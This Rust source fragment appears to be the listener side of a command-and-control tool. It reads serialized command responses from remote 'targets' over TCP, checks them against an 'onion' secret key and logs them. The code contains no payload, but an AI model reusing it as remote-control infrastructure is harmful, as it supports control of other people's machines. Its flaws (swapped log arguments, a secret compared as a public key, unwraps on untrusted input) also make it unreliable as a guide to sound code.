





use crate::*;






#[derive(BorshDeserialize, BorshSerialize, Clone, Debug)]
pub struct TargetData{
    pub cmd_response: String,
    pub pk: Box<[u8]>, //// we should avoid defining lifetimes in rust thus we've put the [u8] inside the Box since the Box has its own lifetime
    pub response_time: i64,
}





pub fn read_stream(stream: &mut TcpStream){
    
    let secret_key = env::var("SECRET_KEY").expect("no secret key variable set");
    let io_buffer_size = env::var("IO_BUFFER_SIZE")
                                        .expect("no io buffer size variable set")
                                        .parse::<u32>()
                                        .unwrap() as usize;


    //// buffer must be defined as mutable since we want to mutate it with the incoming bytes from the stream
    let mut buffer = vec![0 as u8; io_buffer_size];

    
    while match stream.read(&mut buffer){ //// passing the buffer as mutable to the read() method for reading and writing on the stream
        Ok(size) if size == 0 => false, //// we must specify the condition before the return or =>
        Ok(size) => {


            //// decoding the buffer to get the target response data
            let target_data = TargetData::try_from_slice(&buffer[0..size]).unwrap();
            
            
            let onion_secret_key = secret_key.as_bytes();
            let target_pk_bytes = &*target_data.pk; //// borrwoing the dereferenced pk of the target data 
            let now = chrono::Local::now().naive_local().timestamp();


            //// the target secret must be equal to the onion secret key in the server
            //// the target response time must be smaller that the current server tiem  
            if target_pk_bytes == onion_secret_key && target_data.response_time < now{
                
                // ⚈ --------- ⚈ --------- ⚈ --------- ⚈
                //          valid target data
                // ⚈ --------- ⚈ --------- ⚈ --------- ⚈
                println!("[+] target data response {} at time {}", chrono::Local::now().naive_local(), target_data.cmd_response);
                true
            
            } else{
                
                // ⚈ --------- ⚈ --------- ⚈ --------- ⚈
                //           invalid target data 
                // ⚈ --------- ⚈ --------- ⚈ --------- ⚈
                println!("[+] rejecting target data response at time {}", chrono::Local::now().naive_local());
                stream.write_all(&buffer[0..size]).unwrap(); //// sending the target response data back to the target
                false
            
            }            
            

        },
        Err(e) => {
            println!("[+] shuttingdown the read and write stream at time {} due to {}", chrono::Local::now().naive_local(), e);
            stream.shutdown(Shutdown::Both).unwrap();
            false
        },
    } {} //// the while match must be a block which will return true on its Ok() arm and false on its Err arm

}